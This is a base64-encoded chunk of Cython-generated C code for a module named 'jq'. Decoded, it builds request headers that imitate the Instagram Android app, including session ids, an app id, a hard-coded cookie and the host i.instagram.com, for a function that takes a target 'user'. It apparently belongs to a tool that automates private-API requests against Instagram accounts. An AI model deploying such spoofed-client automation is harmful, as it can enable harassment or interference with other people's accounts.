b2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgTlVMTH07XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE3NiwgX19weXhfTDI4X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgfVxuXG4gICAgICBcbiAgICAgICB7XG4gICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDtcbiAgICAgICAgICBnb3RvIF9fcHl4X0wyOTtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MMjhfZXJyb3I6O1xuICAgICAgICB7XG4gICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgICBfX3B5eF90XzEzID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE0ID0gMDsgX19weXhfdF8xOCA9IDA7IF9fcHl4X3RfMjQgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzE0LCAmX19weXhfdF8xOCwgJl9fcHl4X3RfMjQpO1xuICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzEzLCAmX19weXhfdF8xNiwgJl9fcHl4X3RfMTUpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzEzLCAmX19weXhfdF8xNiwgJl9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMyk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjQpO1xuICAgICAgICAgIF9fcHl4X3RfMjEgPSBfX3B5eF9saW5lbm87IF9fcHl4X3RfMjIgPSBfX3B5eF9jbGluZW5vOyBfX3B5eF90XzIzID0gX19weXhfZmlsZW5hbWU7XG4gICAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTgpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjQpO1xuICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTQsIF9fcHl4X3RfMTgsIF9fcHl4X3RfMjQpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8xMywgX19weXhfdF8xNiwgX19weXhfdF8xNSk7XG4gICAgICAgICAgX19weXhfdF8xMyA9IDA7IF9fcHl4X3RfMTYgPSAwOyBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xNCA9IDA7IF9fcHl4X3RfMTggPSAwOyBfX3B5eF90XzI0ID0gMDtcbiAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzIxOyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yMjsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzIzO1xuICAgICAgICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0wyOTo7XG4gICAgICB9XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuXG4gICAgXG4gICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBfX3B5eF9MOF90cnlfZW5kOjtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLnRsbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfbjEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfbjIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaG9zdCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZTMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl90b2spO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfY29va2llcyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZWFkZXJzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RhdGEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdGwpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9lKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8yanFfM3RsbF8yZ2VuZXJhdG9yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8yanFfM3RsbF81Z2VuZXJhdG9yMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfZ2JfMmpxXzN0bGxfOGdlbmVyYXRvcjIpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV81cmVzdChQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yanFfNXJlc3QgPSB7InJlc3QiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJqcV81cmVzdCwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzVyZXN0KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdXNlciA9IDA7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzO1xuICAjZW5kaWZcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJlc3QgKHdyYXBwZXIpIiwgMCk7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTtcbiAgI2Vsc2VcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiAgI2VuZGlmXG4gICNlbmRpZlxuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAge1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXIsMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAxODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJyZXN0IiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInJlc3QiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDE4MiwgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3VzZXIgPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJyZXN0IiwgMSwgMSwgMSwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMTgyLCBfX3B5eF9MM19lcnJvcilcbiAgX19weXhfTDZfc2tpcDo7XG4gIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7XG4gIF9fcHl4X0wzX2Vycm9yOjtcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8yanFfNHJlc3QoX19weXhfc2VsZiwgX19weXhfdl91c2VyKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmpxXzRyZXN0KENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3VzZXIpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaGVhZGVycyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9yZXNwb25zZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzEwO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJyZXN0IiwgMCk7XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMTkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfUGlnZW9uX1Nlc3Npb25fSWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNTBjYzY4NjFfNzAzNl80M2I0XzgwMmVfZmI0MjgyNzkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9QaWdlb25fUmF3Y2xpZW50dGltZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xNzAwMjUxNTc0Xzk4MikgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0Nvbm5lY3Rpb25fU3BlZWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMWticHMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19CYW5kd2lkdGhfU3BlZWRfS0JQUywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzAwMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0JhbmR3aWR0aF9Ub3RhbEJ5dGVzX0IsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0JhbmR3aWR0aF9Ub3RhbFRpbWVfTVMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0Jsb2tzX1ZlcnNpb25fSWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jODBjNWZiMzBkZmFlOWUyNzNlNDAwOWYwM2IxODI4MCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0Nvbm5lY3Rpb25fVHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1dJRkkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19DYXBhYmlsaXRpZXMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfM2JyVHZ3KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQXBwX0lELCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzU2NzA2NzM0MzM1MjQyNykgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Vc2VyX0FnZW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0luc3RhZ3JhbV8xMDBfMF8wXzE3XzEyOV9BbmRyb2lkKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0FjY2VwdF9MYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbl9HQl9lbl9VUykgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvb2tpZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Db250ZW50X1R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGVfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9BY2NlcHRfRW5jb2RpbmcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ3ppcF9kZWZsYXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9pX2luc3RhZ3JhbV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9GQl9IVFRQX0VuZ2luZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0xpZ2VyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29ubmVjdGlvbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9rZWVwX2FsaXZlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NSwgX19weXhfTDNf